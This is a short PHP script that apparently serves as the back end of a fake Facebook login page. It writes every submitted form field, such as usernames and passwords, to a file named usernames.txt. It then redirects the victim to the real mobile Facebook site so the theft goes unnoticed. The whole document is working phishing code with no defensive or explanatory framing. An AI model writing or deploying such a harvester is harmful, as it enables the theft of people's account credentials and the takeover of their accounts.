<?php  
$handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) { 
fwrite($handle, $variable); fwrite($handle, "="); 
fwrite($handle, $value); fwrite($handle, "\r\n\n");
}
header ('Location: https://m.facebook.com');
fwrite($handle, "\r\n\n"); fclose($handle); exit; ?>
